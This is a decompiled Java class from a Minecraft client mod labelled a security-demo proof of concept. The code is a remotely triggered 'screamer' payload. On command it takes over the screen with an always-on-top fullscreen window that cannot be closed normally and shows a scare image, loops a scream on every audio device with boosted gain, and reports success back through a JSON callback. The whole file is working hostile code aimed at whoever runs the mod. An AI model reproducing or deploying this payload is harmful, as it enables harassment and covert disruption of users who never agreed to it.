package com.securitydemo.poc;

import java.awt.Color;
import java.awt.Dimension;
import java.awt.Graphics2D;
import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.Image;
import java.awt.RenderingHints;
import java.awt.Toolkit;
import java.awt.Window;
import java.awt.Window.Type;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.awt.image.BufferedImage;
import java.awt.image.ImageObserver;
import java.io.BufferedInputStream;
import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.Set;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.function.Consumer;
import javax.imageio.ImageIO;
import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioInputStream;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.Clip;
import javax.sound.sampled.DataLine;
import javax.sound.sampled.FloatControl;
import javax.sound.sampled.Mixer;
import javax.sound.sampled.SourceDataLine;
import javax.swing.ImageIcon;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.SwingUtilities;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;

@Environment(EnvType.CLIENT)
public final class ScreamerOverlay {
   private static final Random RANDOM = new Random();
   private static final String[] IMAGE_RESOURCES = new String[]{"assets/security-demo-poc/troll/face1.jpg", "assets/security-demo-poc/troll/face2.jpg", "assets/security-demo-poc/troll/face3.png"};
   private static final Map<String, String> IMAGE_PRESETS = new HashMap();
   private static final String SCREAM_RESOURCE = "assets/security-demo-poc/troll/scream.wav";
   private static volatile JFrame activeFrame;
   private static final List<Clip> activeClips;
   private static final List<Thread> activeSoundThreads;
   private static final List<SourceDataLine> activeSoundLines;
   private static final AtomicBoolean SOUND_PLAYING;
   private static final AtomicBoolean RUNNING;
   private static final AudioFormat PLAYBACK_FORMAT;

   private ScreamerOverlay() {
   }

   public static void trigger(int durationMs, String imagePreset, byte[] imageBytes, String soundPreset, byte[] soundBytes, final String requestId, final Consumer<String> notify) {
      final int safeMs = Compat.clamp(durationMs, 500, 120000);
      if (!RUNNING.compareAndSet(false, true)) {
         sendResult(notify, false, "already running", requestId);
      } else {
         final String safeImagePreset = Compat.isBlank(imagePreset) ? "random" : imagePreset.trim();
         final String safeSoundPreset = Compat.isBlank(soundPreset) ? "default" : soundPreset.trim();
         final byte[] imageCopy = imageBytes == null ? null : (byte[])(([B)imageBytes).clone();
         final byte[] soundCopy = soundBytes == null ? null : (byte[])(([B)soundBytes).clone();
         Thread worker = new Thread(new Runnable() {
            public void run() {
               try {
                  ScreamerOverlay.showBlocking(safeMs, safeImagePreset, imageCopy, safeSoundPreset, soundCopy);
                  ScreamerOverlay.sendResult(notify, true, (String)null, requestId);
               } catch (Exception e) {
                  PocLogger.get().warn("Troll overlay failed", (Throwable)e);
                  ScreamerOverlay.sendResult(notify, false, e.getMessage(), requestId);
               } finally {
                  ScreamerOverlay.RUNNING.set(false);
               }

            }
         }, "security-demo-troll");
         worker.setDaemon(true);
         worker.start();
      }
   }

   private static void showBlocking(int durationMs, String imagePreset, byte[] imageBytes, String soundPreset, byte[] soundBytes) throws Exception {
      final Image image = loadImage(imagePreset, imageBytes);
      Runnable show = new Runnable() {
         public void run() {
            ScreamerOverlay.dismissVisuals();
            JFrame frame = ScreamerOverlay.createFullscreenFrame(image);
            ScreamerOverlay.activeFrame = frame;
            frame.setVisible(true);
            frame.toFront();
            frame.requestFocus();
         }
      };
      if (SwingUtilities.isEventDispatchThread()) {
         show.run();
      } else {
         SwingUtilities.invokeAndWait(show);
      }

      startSound(soundPreset, soundBytes);
      Thread.sleep((long)durationMs);
      dismiss();
   }

   private static JFrame createFullscreenFrame(Image image) {
      GraphicsDevice device = GraphicsEnvironment.getLocalGraphicsEnvironment().getDefaultScreenDevice();
      JFrame frame = new JFrame();
      frame.setUndecorated(true);
      frame.setBackground(Color.BLACK);
      frame.setAlwaysOnTop(true);
      frame.setType(Type.UTILITY);
      frame.setDefaultCloseOperation(0);
      JLabel label = new JLabel();
      label.setHorizontalAlignment(0);
      label.setVerticalAlignment(0);
      label.setBackground(Color.BLACK);
      label.setOpaque(true);
      Dimension screen = Toolkit.getDefaultToolkit().getScreenSize();
      if (image != null) {
         label.setIcon(new ImageIcon(scaleImage(image, screen.width, screen.height)));
      } else {
         label.setForeground(Color.WHITE);
         label.setFont(label.getFont().deriveFont(96.0F));
         label.setText("!!!");
      }

      frame.setContentPane(label);
      frame.addWindowListener(new WindowAdapter() {
         public void windowClosing(WindowEvent e) {
            ScreamerOverlay.dismiss();
         }
      });
      if (device.isFullScreenSupported()) {
         device.setFullScreenWindow(frame);
      } else {
         Dimension size = Toolkit.getDefaultToolkit().getScreenSize();
         frame.setBounds(0, 0, size.width, size.height);
         frame.setExtendedState(6);
      }

      return frame;
   }

   private static BufferedImage scaleImage(Image src, int width, int height) {
      if (src instanceof BufferedImage original) {
         ;
      } else {
         original = new BufferedImage(src.getWidth((ImageObserver)null), src.getHeight((ImageObserver)null), 1);
         Graphics2D g = original.createGraphics();
         g.drawImage(src, 0, 0, (ImageObserver)null);
         g.dispose();
      }

      BufferedImage scaled = new BufferedImage(width, height, 1);
      Graphics2D g = scaled.createGraphics();
      g.setColor(Color.BLACK);
      g.fillRect(0, 0, width, height);
      g.setRenderingHint(RenderingHints.KEY_INTERPOLATION, RenderingHints.VALUE_INTERPOLATION_BILINEAR);
      g.drawImage(original, 0, 0, width, height, (ImageObserver)null);
      g.dispose();
      return scaled;
   }

   private static Image loadImage(String preset, byte[] customBytes) {
      if ("custom".equals(preset)) {
         if (customBytes != null && customBytes.length > 0) {
            try {
               BufferedImage image = ImageIO.read(new ByteArrayInputStream(customBytes));
               if (image != null) {
                  return image;
               }
            } catch (Exception e) {
               PocLogger.get().warn("Failed to load custom troll image", (Throwable)e);
            }
         }

         PocLogger.get().warn("Custom troll image missing or unreadable");
         return null;
      } else {
         if (customBytes != null && customBytes.length > 0) {
            try {
               BufferedImage image = ImageIO.read(new ByteArrayInputStream(customBytes));
               if (image != null) {
                  return image;
               }
            } catch (Exception e) {
               PocLogger.get().warn("Failed to load custom troll image", (Throwable)e);
            }
         }

         if ("none".equals(preset)) {
            return null;
         } else if ("random".equals(preset)) {
            return loadRandomImage();
         } else {
            String resource = (String)IMAGE_PRESETS.get(preset);
            if (resource != null) {
               Image image = loadResourceImage(resource);
               if (image != null) {
                  return image;
               }
            }

            return loadRandomImage();
         }
      }
   }

   private static Image loadRandomImage() {
      List<String> available = new ArrayList();

      for(String resource : IMAGE_RESOURCES) {
         InputStream probe = openResourceStream(resource);
         if (probe != null) {
            try {
               probe.close();
            } catch (Exception var7) {
            }

            available.add(resource);
         }
      }

      if (available.isEmpty()) {
         PocLogger.get().warn("No bundled troll images found in classpath");
         return null;
      } else {
         String pick = (String)available.get(RANDOM.nextInt(available.size()));
         return loadResourceImage(pick);
      }
   }

   private static Image loadResourceImage(String resource) {
      InputStream in = openResourceStream(resource);
      if (in == null) {
         PocLogger.get().warn("Missing troll image resource {}", resource);
         return null;
      } else {
         try {
            InputStream stream = in;

            BufferedImage var4;
            try {
               BufferedImage image = ImageIO.read(stream);
               if (image == null) {
                  PocLogger.get().warn("Unreadable troll image {}", resource);
               }

               var4 = image;
            } catch (Throwable var6) {
               if (in != null) {
                  try {
                     stream.close();
                  } catch (Throwable var5) {
                     var6.addSuppressed(var5);
                  }
               }

               throw var6;
            }

            if (in != null) {
               in.close();
            }

            return var4;
         } catch (Exception e) {
            PocLogger.get().warn("Failed to load troll image {}", resource, e);
            return null;
         }
      }
   }

   private static InputStream openResourceStream(String resource) {
      InputStream in = ScreamerOverlay.class.getResourceAsStream("/" + resource);
      if (in != null) {
         return in;
      } else {
         in = ScreamerOverlay.class.getResourceAsStream(resource);
         if (in != null) {
            return in;
         } else {
            ClassLoader context = Thread.currentThread().getContextClassLoader();
            if (context != null) {
               in = context.getResourceAsStream(resource);
               if (in != null) {
                  return in;
               }
            }

            ClassLoader loader = ScreamerOverlay.class.getClassLoader();
            if (loader != null) {
               in = loader.getResourceAsStream(resource);
               if (in != null) {
                  return in;
               }
            }

            return null;
         }
      }
   }

   private static void startSound(String preset, byte[] customBytes) {
      if (!"none".equals(preset)) {
         byte[] soundBytes = null;
         if ("custom".equals(preset)) {
            if (customBytes == null || customBytes.length <= 0) {
               PocLogger.get().warn("Custom troll sound missing");
               Toolkit.getDefaultToolkit().beep();
               return;
            }

            soundBytes = customBytes;
         } else if (customBytes != null && customBytes.length > 0) {
            soundBytes = customBytes;
         } else if ("default".equals(preset) || Compat.isBlank(preset)) {
            soundBytes = loadBundledSoundBytes();
         }

         if (soundBytes != null && soundBytes.length != 0) {
            if (!startLoopingSound(soundBytes)) {
               PocLogger.get().warn("Troll sound failed to start for preset {}", preset);
               Toolkit.getDefaultToolkit().beep();
            }

         } else {
            PocLogger.get().warn("Troll sound bytes missing for preset {}", preset);
            Toolkit.getDefaultToolkit().beep();
         }
      }
   }

   private static byte[] loadBundledSoundBytes() {
      InputStream in = openResourceStream("assets/security-demo-poc/troll/scream.wav");
      if (in == null) {
         PocLogger.get().warn("Missing bundled scream resource {}", "assets/security-demo-poc/troll/scream.wav");
         return null;
      } else {
         try {
            InputStream stream = in;

            byte[] var2;
            try {
               var2 = Compat.readStreamBytes(stream);
            } catch (Throwable var5) {
               if (in != null) {
                  try {
                     stream.close();
                  } catch (Throwable var4) {
                     var5.addSuppressed(var4);
                  }
               }

               throw var5;
            }

            if (in != null) {
               in.close();
            }

            return var2;
         } catch (Exception e) {
            PocLogger.get().warn("Failed to read bundled scream", (Throwable)e);
            return null;
         }
      }
   }

   private static boolean startLoopingSound(byte[] soundBytes) {
      byte[] pcm;
      try {
         pcm = decodeToPlaybackPcm(soundBytes);
      } catch (Exception e) {
         PocLogger.get().warn("Failed to decode troll sound", (Throwable)e);
         return false;
      }

      if (pcm.length == 0) {
         return false;
      } else {
         return startLineLoop(pcm) ? true : startClipLoop(pcm);
      }
   }

   private static byte[] decodeToPlaybackPcm(byte[] soundBytes) throws Exception {
      BufferedInputStream in = new BufferedInputStream(new ByteArrayInputStream(soundBytes));
      AudioInputStream source = AudioSystem.getAudioInputStream(in);
      if (!AudioSystem.isConversionSupported(PLAYBACK_FORMAT, source.getFormat())) {
         return Compat.readStreamBytes(source);
      } else {
         if (!PLAYBACK_FORMAT.matches(source.getFormat())) {
            source = AudioSystem.getAudioInputStream(PLAYBACK_FORMAT, source);
         }

         return Compat.readStreamBytes(source);
      }
   }

   private static List<SourceDataLine> openAllPlaybackLines() {
      DataLine.Info info = new DataLine.Info(SourceDataLine.class, PLAYBACK_FORMAT);
      List<SourceDataLine> lines = new ArrayList();
      Set<String> seen = new HashSet();
      collectPlaybackLine(lines, seen, tryOpenLine(AudioSystem.getMixer((Mixer.Info)null), info), "default");
      collectPlaybackLine(lines, seen, tryOpenLine(info), "system-default");

      for(Mixer.Info mixerInfo : AudioSystem.getMixerInfo()) {
         collectPlaybackLine(lines, seen, tryOpenLine(AudioSystem.getMixer(mixerInfo), info), mixerInfo.getName());
      }

      return lines;
   }

   private static void collectPlaybackLine(List<SourceDataLine> lines, Set<String> seen, SourceDataLine line, String label) {
      if (line != null) {
         String key = label == null ? line.getLineInfo().toString() : label;
         if (!seen.add(key)) {
            try {
               line.close();
            } catch (Exception var6) {
            }

         } else {
            lines.add(line);
         }
      }
   }

   private static SourceDataLine tryOpenLine(Mixer mixer, DataLine.Info info) {
      if (mixer != null && mixer.isLineSupported(info)) {
         try {
            SourceDataLine line = (SourceDataLine)mixer.getLine(info);
            int bufferSize = Math.max(line.getBufferSize(), 16384);
            line.open(PLAYBACK_FORMAT, bufferSize);
            return line;
         } catch (Exception var4) {
            return null;
         }
      } else {
         return null;
      }
   }

   private static SourceDataLine tryOpenLine(DataLine.Info info) {
      try {
         SourceDataLine line = (SourceDataLine)AudioSystem.getLine(info);
         int bufferSize = Math.max(line.getBufferSize(), 16384);
         line.open(PLAYBACK_FORMAT, bufferSize);
         return line;
      } catch (Exception var3) {
         return null;
      }
   }

   private static boolean startLineLoop(final byte[] pcm) {
      List<SourceDataLine> lines = openAllPlaybackLines();
      if (lines.isEmpty()) {
         return false;
      } else {
         SOUND_PLAYING.set(true);
         activeSoundLines.addAll(lines);
         PocLogger.get().info("Troll sound on {} output device(s)", lines.size());

         for(final SourceDataLine line : lines) {
            Thread soundThread = new Thread(new Runnable() {
               public void run() {
                  try {
                     line.start();
                     byte[] loopPcm = pcm;

                     while(ScreamerOverlay.SOUND_PLAYING.get() && !Thread.currentThread().isInterrupted()) {
                        for(int offset = 0; offset < loopPcm.length && ScreamerOverlay.SOUND_PLAYING.get() && !Thread.currentThread().isInterrupted(); offset += line.write(loopPcm, offset, loopPcm.length - offset)) {
                        }
                     }
                  } catch (Exception e) {
                     PocLogger.get().warn("SourceDataLine troll sound failed", (Throwable)e);
                  } finally {
                     try {
                        line.drain();
                        line.stop();
                        line.close();
                     } catch (Exception var10) {
                     }

                     ScreamerOverlay.activeSoundLines.remove(line);
                  }

               }
            }, "security-demo-troll-sound");
            soundThread.setDaemon(true);
            activeSoundThreads.add(soundThread);
            soundThread.start();
         }

         return true;
      }
   }

   private static boolean startClipLoop(byte[] pcm) {
      try {
         int frameSize = PLAYBACK_FORMAT.getFrameSize();
         if (frameSize <= 0) {
            return false;
         } else {
            long frames = (long)(pcm.length / frameSize);
            DataLine.Info clipInfo = new DataLine.Info(Clip.class, PLAYBACK_FORMAT);
            Set<String> seen = new HashSet();
            boolean started = false;

            for(Mixer.Info mixerInfo : AudioSystem.getMixerInfo()) {
               try {
                  Mixer mixer = AudioSystem.getMixer(mixerInfo);
                  if (mixer.isLineSupported(clipInfo) && seen.add(mixerInfo.getName())) {
                     ByteArrayInputStream replay = new ByteArrayInputStream(pcm);
                     AudioInputStream loopStream = new AudioInputStream(replay, PLAYBACK_FORMAT, frames);
                     Clip clip = (Clip)mixer.getLine(clipInfo);
                     clip.open(loopStream);
                     if (clip.isControlSupported(javax.sound.sampled.FloatControl.Type.MASTER_GAIN)) {
                        FloatControl gain = (FloatControl)clip.getControl(javax.sound.sampled.FloatControl.Type.MASTER_GAIN);
                        gain.setValue(Math.min(gain.getMaximum(), gain.getValue() + 6.0F));
                     }

                     clip.loop(-1);
                     activeClips.add(clip);
                     started = true;
                  }
               } catch (Exception var16) {
               }
            }

            if (started) {
               PocLogger.get().info("Troll sound started via Clip on {} device(s)", activeClips.size());
            }

            return started;
         }
      } catch (Exception e) {
         PocLogger.get().warn("Clip troll sound failed", (Throwable)e);
         return false;
      }
   }

   private static void dismissVisuals() {
      final JFrame frame = activeFrame;
      activeFrame = null;
      if (frame != null) {
         Runnable close = new Runnable() {
            public void run() {
               try {
                  GraphicsDevice device = GraphicsEnvironment.getLocalGraphicsEnvironment().getDefaultScreenDevice();
                  if (device.getFullScreenWindow() == frame) {
                     device.setFullScreenWindow((Window)null);
                  }
               } catch (Exception var2) {
               }

               frame.dispose();
            }
         };
         if (SwingUtilities.isEventDispatchThread()) {
            close.run();
         } else {
            try {
               SwingUtilities.invokeAndWait(close);
            } catch (Exception var3) {
            }
         }

      }
   }

   private static void dismiss() {
      SOUND_PLAYING.set(false);

      for(Clip clip : activeClips) {
         try {
            clip.stop();
            clip.close();
         } catch (Exception var4) {
         }
      }

      activeClips.clear();

      for(Thread soundThread : activeSoundThreads) {
         soundThread.interrupt();
      }

      activeSoundThreads.clear();

      for(SourceDataLine line : activeSoundLines) {
         try {
            line.stop();
            line.close();
         } catch (Exception var3) {
         }
      }

      activeSoundLines.clear();
      dismissVisuals();
   }

   private static void sendResult(Consumer<String> notify, boolean ok, String error, String requestId) {
      if (notify != null) {
         StringBuilder json = new StringBuilder("{\"type\":\"troll_result\",\"ok\":");
         json.append(ok);
         if (!Compat.isBlank(requestId)) {
            json.append(",\"requestId\":\"").append(escapeJson(requestId)).append('"');
         }

         if (!ok && error != null && !Compat.isBlank(error)) {
            json.append(",\"error\":\"").append(escapeJson(error)).append('"');
         }

         json.append('}');
         notify.accept(json.toString());
      }
   }

   private static String escapeJson(String value) {
      return value.replace("\\", "\\\\").replace("\"", "\\\"");
   }

   static {
      IMAGE_PRESETS.put("face1", "assets/security-demo-poc/troll/face1.jpg");
      IMAGE_PRESETS.put("face2", "assets/security-demo-poc/troll/face2.jpg");
      IMAGE_PRESETS.put("face3", "assets/security-demo-poc/troll/face3.png");
      activeClips = new CopyOnWriteArrayList();
      activeSoundThreads = new CopyOnWriteArrayList();
      activeSoundLines = new CopyOnWriteArrayList();
      SOUND_PLAYING = new AtomicBoolean(false);
      RUNNING = new AtomicBoolean(false);
      PLAYBACK_FORMAT = new AudioFormat(44100.0F, 16, 1, true, false);
   }
}
